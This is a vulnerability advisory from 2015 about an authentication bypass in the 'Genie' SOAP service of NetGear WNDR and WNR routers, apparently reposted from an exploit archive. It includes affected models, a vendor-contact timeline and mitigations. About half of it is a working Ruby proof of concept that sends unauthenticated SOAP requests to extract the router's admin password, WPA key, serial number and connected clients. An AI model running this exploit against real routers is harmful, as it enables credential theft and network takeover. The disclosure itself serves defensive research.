@@ -1,0 +1,272 @@
+id: 23289
+date: 02/14/2015
+title: NetGear WNDR Authentication Bypass / Information Disclosure Vulnerabilities
+author: Peter Adkins
+cves: 
+
+>> NetGear WNDR Authentication Bypass / Information Disclosure
+
+Reported by:
+----
+Peter Adkins <peter.adkins () kernelpicnic.net>
+
+Access:
+----
+Local network; unauthenticated access.
+Remote network; unauthenticated access*.
+
+Tracking and identifiers:
+----
+CVE - Mitre contacted; not yet allocated.
+
+Platforms / Firmware confirmed affected:
+----
+NetGear WNDR3700v4 - V1.0.0.4SH
+NetGear WNDR3700v4 - V1.0.1.52
+NetGear WNR2200 - V1.0.1.88
+NetGear WNR2500 - V1.0.0.24
+
+Additional platforms believed to be affected:
+----
+NetGear WNDR3800
+NetGear WNDRMAC
+NetGear WPN824N
+NetGear WNDR4700
+
+Vendor involvement:
+----
+2015-01-18 - Initial contact with NetGear regarding vulnerability.
+2015-01-18 - NetGear advised to email support with concerns.
+2015-01-18 - Email sent to NetGear (support).
+2015-01-19 - Email sent to Mitre.
+2015-01-20 - NetGear (support) advised that a ticket had been created.
+2015-01-21 - NetGear (support) requested product verification.
+2015-01-21 - Replied to NetGear with information requested.
+2015-01-23 - NetGear (support) requested clarification of model.
+2015-01-23 - Replied to NetGear with list of affected models.
+2015-01-27 - NetGear (support) replied with router security features.
+2015-01-27 - Replied to NetGear and reiterated vulnerability.
+2015-01-29 - Email sent to NetGear (OpenSource) regarding issue.
+2015-01-30 - Case auto-closure email received from NetGear (support).
+2015-02-01 - Reply from Mitre requesting additional information.
+2015-02-01 - Email to Mitre with additional information.
+2015-02-11 - Vulnerability published to Bugtraq and GitHub.
+
+Mitigation:
+----
+* Ensure remote / WAN management is disabled on the affected devices.
+* Only allow trusted devices access to the local network.
+
+Notes:
+----
+* These vulnerabilities can be leveraged "externally" over the internet,
+but require devices to have remote / WAN management enabled.
+
+* Due to the location of this issue (net-cgi) this vulnerability may be
+present in other devices and firmware revisions not listed in this
+document.
+
+* In the absence of a known security contact these issues were reported
+to NetGear support. The initial response from NetGear support was that
+despite these issues "the network should still stay secure" due to a
+number of built-in security features. Attempts to clarify the nature of
+this vulnerability with support were unsuccessful. This ticket has since
+been auto-closed while waiting for a follow up. A subsequent email sent
+to the NetGear 'OpenSource' contact has also gone unanswered.
+
+* If you have a NetGear device that is believed to be affected and can
+confirm whether the PoC works successfully, please let me know and I
+will update the copy of this document on GitHub (see below) and provide
+credit for your findings.
+
+----
+"Genie" SOAP Service
+----
+
+A number of NetGear WNDR devices contain an embedded SOAP service that
+is seemingly for use with the NetGear Genie application. This service
+allows for viewing and setting of certain router parameters, such as:
+
+ * WLAN credentials and SSIDs.
+ * Connected clients.
+ * Guest WLAN credentials and SSIDs.
+ * Parental control settings.
+
+At first glance, this service appears to be filtered and authenticated;
+HTTP requests with a `SOAPAction` header set but without a session
+identifier will yield a HTTP 401 error. However, a HTTP request with a
+blank form and a `SOAPAction` header is sufficient to execute certain
+requests and query information from the device.
+
+As this SOAP service is implemented by the built-in HTTP / CGI daemon,
+unauthenticated queries will also be answered over the internet if
+remote management has been enabled on the device. As a result, affected
+devices can be interrogated and hijacked with as little as a well placed
+HTTP query.
+
+The attached proof of concept uses this service in order to extract the
+administrator password, device serial number, WLAN details, and various
+details regarding clients currently connected to the device.
+
+A copy of this document, as well as the proof of concept below and a
+more detailed write-up has been made available via GitHub:
+
+ * https://github.com/darkarnium/secpub/tree/master/NetGear/SOAPWNDR
+
+----
+Ruby PoC
+----
+
+require 'optparse'
+require 'nokogiri'
+require 'restclient'
+
+# Set defaults and parse command line arguments
+options = {}
+
+options[:addr] = "192.168.1.1"
+options[:port] = 80
+options[:ssl] = false
+
+OptionParser.new do |option|
+
+  option.on("--address [ADDRESS]", "Destination hostname or IP") do |a|
+    options[:addr] = a
+  end
+
+  option.on("--port [PORT]", "Destination TCP port") do |p|
+    options[:port] = p
+  end
+
+  option.on("--[no-]ssl", "Destination uses SSL") do |s|
+    options[:ssl] = s
+  end
+
+  option.parse!
+
+end
+
+# Define which SOAPActions we will be using.
+actions = [
+  {
+    :name => "Fetch password",
+    :call => "lan_config_security_get_info",
+    :soap => "LANConfigSecurity:1#GetInfo"
+  },
+  {
+    :name => "Fetch WLAN",
+    :call => "wlan_config_get_info",
+    :soap => "WLANConfiguration:1#GetInfo"
+  },
+  {
+    :name => "Fetch WPA Security Keys",
+    :call => "wlan_config_get_wpa_keys",
+    :soap => "WLANConfiguration:1#GetWPASecurityKeys"
+  },
+  {
+    :name => "Fetch hardware",
+    :call => "device_info_get_info",
+    :soap => "DeviceInfo:1#GetInfo"
+  },
+  {
+    :name => "Fetch hardware",
+    :call => "device_info_get_attached",
+    :soap => "DeviceInfo:1#GetAttachDevice"
+  }
+  #{
+  #  :name => "Dump configuration",
+  #  :call => "device_config_get_config_info",
+  #  :soap => "DeviceConfig:1#GetConfigInfo"
+  #}
+]
+
+def device_info_get_info(xml)
+  puts "[*] Model Number: #{xml.xpath('//ModelName').text}"
+  puts "[*] Serial Number: #{xml.xpath('//SerialNumber').text}"
+  puts "[*] Firmware Version: #{xml.xpath('//Firmwareversion').text}"
+end
+
+def lan_config_security_get_info(xml)
+  puts "[*] Admin Password: #{xml.xpath("//NewPassword").text}"
+end
+
+def wlan_config_get_info(xml)
+  puts "[*] WLAN SSID: #{xml.xpath('//NewSSID').text}"
+  puts "[*] WLAN Enc: #{xml.xpath('//NewBasicEncryptionModes').text}"
+end
+
+def wlan_config_get_wpa_keys(xml)
+  puts "[*] WLAN WPA Key: #{xml.xpath('//NewWPAPassphrase').text} "
+end
+
+def device_config_get_config_info(xml)
+  puts "[*] Base64 Config: #{xml.xpath('//NewConfigFile').text} "
+end
+
+def device_info_get_attached(xml)
+
+  # Data is '@' delimited.
+  devices = xml.xpath('//NewAttachDevice').text.split("@")
+  devices.each_index do |i|
+
+    # First element is a device count.
+    if i == 0
+      next
+    end
+
+    # Split by ';' which pulls out the device IP, name and MAC.
+    detail = devices[i].split(";")
+    puts "[*] Attached: #{detail[2]} - #{detail[1]} (#{detail[3]})"
+
+  end
+
+end
+
+# Form endpoint based on protocol, no path is required.
+if options[:ssl]
+  endpoint = "https://#{options[:addr]}:#{options[:port]}/"
+else
+  endpoint = "http://#{options[:addr]}:#{options[:port]}/"
+end
+
+# Iterate over all actions and attempt to execute.
+puts "[!] Attempting to extract information from #{endpoint}"
+
+actions.each do |action|
+
+  # Build the target URL and setup the HTTP client object.
+  request = RestClient::Resource.new(
+    endpoint,
+    :verify_ssl => OpenSSL::SSL::VERIFY_NONE)
+
+  # Fire the request and ensure a 200 OKAY.
+  begin
+    response = request.post(
+      { "" => "" },
+      { "SOAPAction" => "urn:NETGEAR-ROUTER:service:#{action[:soap]}"})
+  rescue
+    puts "[!] Failed to query remote host."
+    abort
+  end
+
+  if response.code != 200
+    puts "[-] '#{action[:name]}' failed with response: #{response.code}"
+    next
+  end
+
+  # Parse XML document.
+  xml = Nokogiri::XML(response.body())
+
+  if xml.xpath('//ResponseCode').text == '401'
+    puts "[-] '#{action[:name]}' failed with a SOAP error (401)"
+    next
+  end
+
+  # Send to the processor.
+  send(action[:call], xml)
+
+end
+
+# FIN.
+
+#  0day.today [2023-03-25]  #
